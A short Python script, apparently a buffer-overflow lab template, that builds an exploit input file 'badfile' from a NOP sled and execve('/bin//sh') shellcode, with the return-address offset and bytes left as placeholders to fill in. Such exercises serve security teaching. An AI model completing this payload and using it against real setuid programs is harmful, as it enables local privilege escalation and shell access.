#!/usr/bin/python

import sys

shellcode=    \
"\x31\xc0"    \
"\x50"        \
"\x68""//sh"  \
"\x68""/bin"  \
"\x89\xe3"    \
"\x50"        \
"\x53"        \
"\x89\xe1"    \
"\x99"        \
"\xb0\x0b"    \
"\xcd\x80"    \
"\x00"

# Fill the content with NOP's
content = ["\x90" for i in range(517)]

#########################################################################
# Replace 0 with the correct offset value
D =  0                  
# Fill the return address field with the address of the shellcode
# Replace FF with the correct value 
content[D+0] = "\xFF"   # fill in the 1st byte (least significant byte) 
content[D+1] = "\xFF"   # fill in the 2nd byte 
content[D+2] = "\xFF"   # fill in the 3rd byte
content[D+3] = "\xFF"   # fill in the 4th byte (most significant byte)
#########################################################################

# Put the shellcode at the end
start = 517 - len(shellcode) 
content[start:] = shellcode

# Write the content to badfile
file = open("badfile", "wb")
file.write(''.join(content))
file.close()
